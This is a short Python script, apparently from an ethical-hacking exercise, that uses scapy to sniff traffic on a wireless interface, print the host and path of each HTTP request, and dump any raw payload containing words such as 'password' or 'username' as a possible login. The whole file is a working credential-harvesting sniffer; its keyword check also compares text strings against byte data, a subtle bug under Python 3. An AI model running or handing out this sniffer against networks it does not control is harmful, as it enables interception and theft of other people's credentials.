#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_data)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_load(packet):
    if packet.haslayer(scapy.Raw):
        load_data = packet[scapy.Raw].load
        kws = ["pass", "uname", "username", "password"]
        for k in kws:
            if k in load_data:
                return load_data


def process_data(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(f"HTTP Requset ->> {url}")

        load_data = get_load(packet)
        if load_data:
            print(f"\nPossible username/password ->> {load_data}\n")


sniff("wlp3s0")
